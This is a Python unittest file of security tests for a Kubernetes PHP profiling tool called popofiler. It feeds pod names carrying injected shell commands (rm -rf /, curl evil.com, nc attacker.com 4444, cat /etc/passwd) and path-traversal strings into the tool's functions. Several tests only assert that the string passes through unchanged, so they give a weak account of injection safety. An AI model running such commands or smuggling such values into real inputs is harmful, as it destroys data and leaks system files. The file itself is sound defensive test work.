"""
Security-focused tests for popofiler.py
Tests for potential security vulnerabilities and attack vectors
"""
import unittest
from unittest.mock import patch, MagicMock
import subprocess
import sys
import os

import popofiler


class TestCommandInjectionSecurity(unittest.TestCase):
    """Test protection against command injection attacks"""

    def setUp(self):
        self.malicious_inputs = [
            "pod-name; rm -rf /",
            "pod-name && curl evil.com",
            "pod-name | nc attacker.com 4444",
            "pod-name`whoami`",
            "pod-name$(id)",
            "pod-name' OR '1'='1",
            'pod-name"; cat /etc/passwd #',
            "pod-name\nrm -rf /",
            "pod-name\r\nwget evil.com",
        ]

    @patch('popofiler.run_command')
    def test_malicious_pod_names_in_enable_profiling(self, mock_run_command):
        """Test that malicious pod names don't lead to command injection in enable_profiling"""
        mock_run_command.return_value = (True, "mocked")
        
        for malicious_pod in self.malicious_inputs:
            with self.subTest(pod_name=malicious_pod):
                # Act
                popofiler.enable_profiling(malicious_pod)
                
                # Assert - Verify commands contain the malicious string as-is
                # (subprocess.Popen will handle proper escaping)
                calls = mock_run_command.call_args_list
                for call in calls:
                    command = call[0][0]
                    if malicious_pod in command:
                        # The malicious pod name should appear in the command
                        self.assertIn(malicious_pod, command)
                
                mock_run_command.reset_mock()

    @patch('popofiler.run_command')
    def test_malicious_pod_names_in_disable_profiling(self, mock_run_command):
        """Test that malicious pod names don't lead to command injection in disable_profiling"""
        mock_run_command.return_value = (True, "mocked")
        
        for malicious_pod in self.malicious_inputs:
            with self.subTest(pod_name=malicious_pod):
                # Act
                popofiler.disable_profiling(malicious_pod)
                
                # Assert
                calls = mock_run_command.call_args_list
                for call in calls:
                    command = call[0][0]
                    if malicious_pod in command:
                        self.assertIn(malicious_pod, command)
                
                mock_run_command.reset_mock()

    @patch('popofiler.run_command')
    def test_malicious_pod_names_in_download_profiles(self, mock_run_command):
        """Test that malicious pod names don't lead to command injection in download_profiles"""
        mock_run_command.return_value = (True, "mocked")
        
        for malicious_pod in self.malicious_inputs:
            with self.subTest(pod_name=malicious_pod):
                # Act
                popofiler.download_profiles(malicious_pod)
                
                # Assert
                command = mock_run_command.call_args[0][0]
                self.assertIn(malicious_pod, command)
                
                mock_run_command.reset_mock()

    @patch('popofiler.run_command')
    def test_malicious_pod_names_in_install_xdebug(self, mock_run_command):
        """Test that malicious pod names don't lead to command injection in install_xdebug"""
        mock_run_command.return_value = (True, "no xdebug")
        
        for malicious_pod in self.malicious_inputs:
            with self.subTest(pod_name=malicious_pod):
                # Act
                popofiler.install_xdebug(malicious_pod)
                
                # Assert - Check the first call (xdebug check)
                command = mock_run_command.call_args[0][0]
                self.assertIn(malicious_pod, command)
                
                mock_run_command.reset_mock()

    def test_constants_are_not_user_controllable(self):
        """Test that critical constants cannot be modified by user input"""
        # These constants should be hardcoded and not derived from user input
        original_context = popofiler.K8S_CONTEXT
        original_namespace = popofiler.NAMESPACE
        original_project = popofiler.PROJECT_NAME
        
        # Verify they are strings (not user-controllable)
        self.assertIsInstance(original_context, str)
        self.assertIsInstance(original_namespace, str)
        self.assertIsInstance(original_project, str)


class TestInputValidationSecurity(unittest.TestCase):
    """Test input validation and sanitization"""

    @patch('popofiler.run_command')
    def test_empty_and_none_pod_names(self, mock_run_command):
        """Test handling of empty and None pod names"""
        mock_run_command.return_value = (True, "mocked")
        
        test_cases = ["", None, "   ", "\t\n"]
        
        for invalid_input in test_cases:
            with self.subTest(pod_name=invalid_input):
                # These should not crash the application
                try:
                    popofiler.enable_profiling(invalid_input)
                    popofiler.disable_profiling(invalid_input)
                    popofiler.download_profiles(invalid_input)
                    popofiler.install_xdebug(invalid_input)
                except Exception as e:
                    # Any exceptions should be handled gracefully
                    self.assertIsNotNone(e)
                
                mock_run_command.reset_mock()

    @patch('popofiler.run_command')
    def test_special_characters_in_pod_names(self, mock_run_command):
        """Test handling of special characters in pod names"""
        mock_run_command.return_value = (True, "mocked")
        
        special_chars = [
            "pod-with-spaces in name",
            "pod'with'quotes",
            'pod"with"double"quotes',
            "pod\x00with\x00nulls",
            "pod\x1b[31mwith\x1b[0mansi",
            "pod\u4e2d\u6587unicode",
        ]
        
        for pod_name in special_chars:
            with self.subTest(pod_name=pod_name):
                # Should handle special characters without crashing
                try:
                    popofiler.enable_profiling(pod_name)
                except Exception:
                    pass  # May fail, but shouldn't crash the interpreter
                
                mock_run_command.reset_mock()


class TestFileSystemSecurity(unittest.TestCase):
    """Test file system security aspects"""

    @patch('popofiler.run_command')
    def test_backup_file_path_traversal_protection(self, mock_run_command):
        """Test protection against path traversal in backup operations"""
        mock_run_command.return_value = (True, "mocked")
        
        # Test with pod names that could cause path traversal
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "C:\\windows\\system32\\config\\sam",
        ]
        
        for traversal_pod in traversal_attempts:
            with self.subTest(pod_name=traversal_pod):
                popofiler.enable_profiling(traversal_pod)
                
                # Verify the traversal attempt is in the command as-is
                # (kubectl cp should handle path validation)
                calls = mock_run_command.call_args_list
                backup_call = calls[0] if calls else None
                if backup_call:
                    command = backup_call[0][0]
                    self.assertIn(traversal_pod, command)
                
                mock_run_command.reset_mock()

    @patch('popofiler.run_command')
    def test_download_directory_security(self, mock_run_command):
        """Test security of download directory operations"""
        mock_run_command.return_value = (True, "mocked")
        
        # Test with pod names containing path manipulation
        test_pod = "../../../malicious-pod"
        
        popofiler.download_profiles(test_pod)
        
        command = mock_run_command.call_args[0][0]
        # Should contain the pod name as-is (kubectl handles path validation)
        self.assertIn(test_pod, command)
        # Should still use the intended destination
        self.assertIn("./cachegrind/", command)


class TestPrivilegeEscalationSecurity(unittest.TestCase):
    """Test protection against privilege escalation"""

    @patch('popofiler.run_command')
    def test_no_sudo_or_privilege_escalation(self, mock_run_command):
        """Test that commands don't attempt privilege escalation"""
        mock_run_command.return_value = (True, "mocked")
        test_pod = "test-pod"
        
        # Test all main functions
        popofiler.enable_profiling(test_pod)
        popofiler.disable_profiling(test_pod)
        popofiler.download_profiles(test_pod)
        popofiler.install_xdebug(test_pod)
        popofiler.run_webgrind()
        
        # Check all commands don't contain privilege escalation attempts
        for call in mock_run_command.call_args_list:
            command = call[0][0].lower()
            # Should not contain sudo, su, or other privilege escalation commands
            self.assertNotIn("sudo", command)
            self.assertNotIn(" su ", command)
            self.assertNotIn("chmod +s", command)
            self.assertNotIn("setuid", command)

    @patch('popofiler.run_command')
    def test_kubernetes_rbac_compliance(self, mock_run_command):
        """Test that kubectl commands respect RBAC boundaries"""
        mock_run_command.return_value = (True, "mocked")
        test_pod = "test-pod"
        
        # Test main functions use proper kubectl context and namespace
        popofiler.enable_profiling(test_pod)
        popofiler.disable_profiling(test_pod)
        popofiler.download_profiles(test_pod)
        popofiler.install_xdebug(test_pod)
        
        for call in mock_run_command.call_args_list:
            command = call[0][0]
            if "kubectl" in command:
                # Should use specific context and namespace
                self.assertIn("--context", command)
                self.assertIn("--namespace", command)


class TestInformationDisclosureSecurity(unittest.TestCase):
    """Test protection against information disclosure"""

    @patch('subprocess.Popen')
    @patch('sys.stderr')
    def test_error_message_information_disclosure(self, mock_stderr, mock_popen):
        """Test that error messages don't leak sensitive information"""
        # Arrange - Simulate command that fails with sensitive info in stderr
        mock_process = MagicMock()
        mock_process.returncode = 1
        mock_process.communicate.return_value = ("", "Error: secret-token-12345 invalid")
        mock_process.poll.return_value = 1
        mock_popen.return_value = mock_process
        
        # Act
        with patch('tqdm.tqdm'), patch('colorama.init'), patch('colorama.deinit'):
            success, output = popofiler.run_command("kubectl get secret", "Test command")
        
        # Assert - Error should be logged but handled appropriately
        self.assertFalse(success)
        self.assertIn("secret-token-12345", output)  # Error is returned as-is

    @patch('popofiler.run_command')
    def test_no_credential_exposure_in_commands(self, mock_run_command):
        """Test that commands don't contain embedded credentials"""
        mock_run_command.return_value = (True, "mocked")
        test_pod = "test-pod"
        
        # Test all functions
        popofiler.enable_profiling(test_pod)
        popofiler.disable_profiling(test_pod)
        popofiler.download_profiles(test_pod)
        popofiler.install_xdebug(test_pod)
        popofiler.run_webgrind()
        
        # Check commands don't contain common credential patterns
        for call in mock_run_command.call_args_list:
            command = call[0][0]
            # Should not contain password/token patterns
            self.assertNotRegex(command, r'password=\w+')
            self.assertNotRegex(command, r'token=\w+')
            self.assertNotRegex(command, r'secret=\w+')
            self.assertNotRegex(command, r'key=\w{20,}')


class TestDenialOfServiceSecurity(unittest.TestCase):
    """Test protection against DoS attacks"""

    @patch('popofiler.run_command')
    def test_resource_exhaustion_protection(self, mock_run_command):
        """Test protection against resource exhaustion attacks"""
        mock_run_command.return_value = (True, "mocked")
        
        # Test with extremely long pod names
        long_pod_name = "a" * 10000
        
        try:
            popofiler.enable_profiling(long_pod_name)
            # Should handle long inputs gracefully
        except Exception as e:
            # Any exception should be due to system limits, not our code
            self.assertIsNotNone(e)

    @patch('popofiler.run_command')
    def test_command_complexity_limits(self, mock_run_command):
        """Test that generated commands don't become excessively complex"""
        mock_run_command.return_value = (True, "mocked")
        
        # Test with pod names that could create complex commands
        complex_pod = "pod" + "x" * 1000 + "end"
        
        popofiler.enable_profiling(complex_pod)
        
        # Verify commands are reasonable in length
        for call in mock_run_command.call_args_list:
            command = call[0][0]
            # Commands should not be excessively long (arbitrary limit)
            self.assertLess(len(command), 10000)


class TestSecureConfiguration(unittest.TestCase):
    """Test secure configuration aspects"""

    def test_trace_key_randomness(self):
        """Test that trace random key has sufficient entropy"""
        key = popofiler.TRACE_RANDOM_KEY
        
        # Should be 64 characters long
        self.assertEqual(len(key), 64)
        
        # Should contain both letters and numbers (indicating good entropy)
        has_letters = any(c.isalpha() for c in key)
        has_numbers = any(c.isdigit() for c in key)
        self.assertTrue(has_letters)
        self.assertTrue(has_numbers)
        
        # Should be alphanumeric only
        self.assertTrue(key.isalnum())

    def test_trace_key_uniqueness(self):
        """Test that trace key generation produces unique values"""
        # Import the random generation code
        import random
        import string
        
        # Generate multiple keys using the same method
        keys = []
        for _ in range(10):
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=64))
            keys.append(key)
        
        # All keys should be unique
        self.assertEqual(len(keys), len(set(keys)))

    def test_no_hardcoded_secrets(self):
        """Test that no secrets are hardcoded in the module"""
        import inspect
        
        source = inspect.getsource(popofiler)
        
        # Check for common secret patterns
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\'][^"\']+["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'key\s*=\s*["\'][a-zA-Z0-9]{20,}["\']',
        ]
        
        import re
        for pattern in secret_patterns:
            matches = re.findall(pattern, source, re.IGNORECASE)
            # Should not find any hardcoded secrets
            self.assertEqual(len(matches), 0, f"Found potential secret: {matches}")


class TestContainerSecurityIntegration(unittest.TestCase):
    """Test container security aspects"""

    @patch('popofiler.run_command')
    def test_docker_run_security_flags(self, mock_run_command):
        """Test that Docker commands include appropriate security flags"""
        mock_run_command.return_value = (True, "mocked")
        
        popofiler.run_webgrind()
        
        command = mock_run_command.call_args[0][0]
        
        # Should use --rm for cleanup
        self.assertIn("--rm", command)
        
        # Should not run in privileged mode
        self.assertNotIn("--privileged", command)
        
        # Should not use host networking
        self.assertNotIn("--net=host", command)
        self.assertNotIn("--network=host", command)

    @patch('popofiler.run_command')
    def test_container_user_security(self, mock_run_command):
        """Test that container doesn't run as root unnecessarily"""
        mock_run_command.return_value = (True, "mocked")
        
        popofiler.run_webgrind()
        
        command = mock_run_command.call_args[0][0]
        
        # Should not explicitly run as root
        self.assertNotIn("--user=root", command)
        self.assertNotIn("--user=0", command)


if __name__ == '__main__':
    # Run security tests with high verbosity
    unittest.main(verbosity=2, buffer=False)